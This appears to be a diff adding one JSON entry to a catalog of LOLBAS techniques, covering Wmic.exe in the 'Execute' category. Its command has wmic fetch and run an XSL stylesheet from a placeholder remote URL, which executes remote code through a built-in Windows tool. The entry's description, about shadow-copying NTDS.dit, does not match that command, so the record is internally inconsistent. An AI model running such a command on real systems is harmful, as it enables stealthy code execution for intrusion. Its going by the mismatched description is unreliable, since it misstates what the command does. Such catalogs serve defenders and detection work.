@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-wmic-exe-execute-3",
+  "name": "LOLBAS · Wmic.exe (Execute) #3",
+  "command": "wmic.exe process get brief /format:\"{REMOTEURL:.xsl}\"",
+  "description": "Create a volume shadow copy of NTDS.dit that can be copied.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "wmic",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Wmic/",
+  "upstream_id": "Wmic.exe/Execute/2",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — Wmic.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Wmic/"
+    }
+  ]
+}
